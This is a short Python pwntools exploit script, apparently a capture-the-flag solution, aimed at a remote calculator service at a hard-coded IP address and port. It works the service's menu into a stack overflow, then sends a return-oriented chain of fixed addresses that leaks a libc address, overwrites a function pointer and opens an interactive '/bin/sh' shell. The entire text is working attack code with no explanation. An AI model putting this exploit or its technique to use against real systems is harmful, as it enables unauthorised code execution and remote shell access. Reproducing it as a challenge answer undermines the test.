from pwn import *

HOST = "49.236.136.140"
PORT = 14000
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
def calc(op, v1, v2):
  s.recvuntil('4.Divide')
  s.sendline(str(op))
  s.sendline(str(v1))
  s.sendline(str(v2))

raw_input()
calc(1,0,1)
calc(1,0,1)
calc(1,0,1)
calc(1,0,1)
calc(1,0,1)

calc(2,1,0)
calc(2,1,0)
calc(2,1,0)
calc(2,1,0)
calc(2,1,0)

calc(4,1,1)
calc(4,1,1)
calc(4,1,1)
calc(4,1,1)
calc(4,1,1)

calc(3,245687,1)
calc(3,1,1)
calc(3,1,1)
calc(3,1,1)
calc(3,1,1)

s.sendline('7')
calc(4,1,1)

s.recvuntil('!')
s.recvuntil('!')
dat = "A"*(0x12+0x4)
dat += p32(0x8048420)
dat += p32(0x080489eb) # pop ebx ; ret
dat += p32(0x804A014)
dat += p32(0x8048410)
dat += p32(0x080489e9) # pop esi ; pop edi ; pop ebp ; ret
dat += p32(0)
dat += p32(0x804A00C)
dat += p32(0x20)
dat += p32(0x8048410)
dat += p32(0xdeadbeef)
dat += p32(0x0804A00C+4)

s.send(dat)
libc = u32(s.recv(4))
print "libc : ", hex(libc)
s.send(p32(libc-0x24800)+"/bin/sh\x00")
s.interactive()
